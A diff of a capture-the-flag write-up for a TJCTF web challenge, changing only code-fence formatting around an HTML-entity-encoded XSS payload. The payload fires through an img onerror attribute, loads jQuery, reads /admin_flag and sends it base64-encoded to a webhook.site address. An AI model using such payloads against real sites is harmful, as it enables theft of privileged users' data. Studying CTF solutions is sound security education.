@@ -85,7 +85,7 @@ tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}
 **Note from Drakon:** I solved this the intended way, and I bypassed the filter by just encoding my characters with HTML entities.
 
 The Javascript itself is pretty basic:
-```
+```javascript
 var script = document.createElement("script");
 script.src = "https://code.jquery.com/jquery-3.3.1.min.js";
 document.head.appendChild(script);
@@ -107,5 +107,6 @@ window.addEventListener("load", function ()
 I executed the script with the `onerror` attribute, and since you don't need quotes for attributes (as long as the attributes themselves have no spaces or quotes), you can just leave them out.
 
 One small snag was the fact that my solve used jquery, and jquery is loaded in *after* the XSS, so I had to use JS to create a `<script>` tag. The final payload was:
-```<img src=lol onerror=var&nbsp;script&nbsp;&equals;&nbsp;document&period;createElement&lpar;&quot;script&quot;&rpar;&semi;&nbsp;script&period;src&nbsp;&equals;&nbsp;&quot;https&colon;&sol;&sol;code&period;jquery&period;com&sol;jquery-3&period;3&period;1&period;min&period;js&quot;&semi;&nbsp;document&period;head&period;appendChild&lpar;script&rpar;&semi;&nbsp;window&period;addEventListener&lpar;&quot;load&quot;&comma;&nbsp;function&nbsp;&lpar;&rpar;&nbsp;&lcub;&dollar;&period;ajax&lpar;&lcub;type&colon;&nbsp;&quot;GET&quot;&comma;url&colon;&nbsp;&quot;&sol;admin&lowbar;flag&quot;&comma;success&colon;&nbsp;function&lpar;resp&rpar;&nbsp;&lcub;flag&equals;resp&semi;document&period;location&equals;&quot;https&colon;&sol;&sol;webhook&period;site&sol;72244fec-fd93-42f5-8b09-797fccfd078d&quest;c&equals;&quot;&plus;btoa&lpar;flag&rpar;&semi;&rcub;&rcub;&rpar;&semi;&rcub;&rpar;>```
-
+```
+<img src=lol onerror=var&nbsp;script&nbsp;&equals;&nbsp;document&period;createElement&lpar;&quot;script&quot;&rpar;&semi;&nbsp;script&period;src&nbsp;&equals;&nbsp;&quot;https&colon;&sol;&sol;code&period;jquery&period;com&sol;jquery-3&period;3&period;1&period;min&period;js&quot;&semi;&nbsp;document&period;head&period;appendChild&lpar;script&rpar;&semi;&nbsp;window&period;addEventListener&lpar;&quot;load&quot;&comma;&nbsp;function&nbsp;&lpar;&rpar;&nbsp;&lcub;&dollar;&period;ajax&lpar;&lcub;type&colon;&nbsp;&quot;GET&quot;&comma;url&colon;&nbsp;&quot;&sol;admin&lowbar;flag&quot;&comma;success&colon;&nbsp;function&lpar;resp&rpar;&nbsp;&lcub;flag&equals;resp&semi;document&period;location&equals;&quot;https&colon;&sol;&sol;webhook&period;site&sol;72244fec-fd93-42f5-8b09-797fccfd078d&quest;c&equals;&quot;&plus;btoa&lpar;flag&rpar;&semi;&rcub;&rcub;&rpar;&semi;&rcub;&rpar;>
+```
